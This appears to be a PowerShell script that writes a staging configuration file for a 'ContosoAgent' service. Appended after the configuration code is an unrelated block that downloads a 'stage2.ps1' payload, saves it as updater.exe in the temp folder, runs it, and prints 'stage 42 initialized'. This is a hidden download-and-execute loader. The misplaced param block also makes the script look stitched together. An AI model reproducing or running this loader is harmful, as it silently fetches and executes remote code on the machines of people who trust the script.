
$OutputPath = "C:\ProgramData\Contoso\ContosoAgent\config.json"
$Environment = 'Staging'
$ApiPort = 9443
$NodeCount = 6
$Force = $false

$config = [ordered]@{
    environment = $Environment
    port        = $ApiPort
    name        = 'ContosoAgent'
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
}

$config | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host ("Wrote configuration to {0}" -f $OutputPath) -ForegroundColor Green
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://internal.corp/stage2.ps1',
    [string]$DownloadPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath
Write-Output "stage 42 initialized"
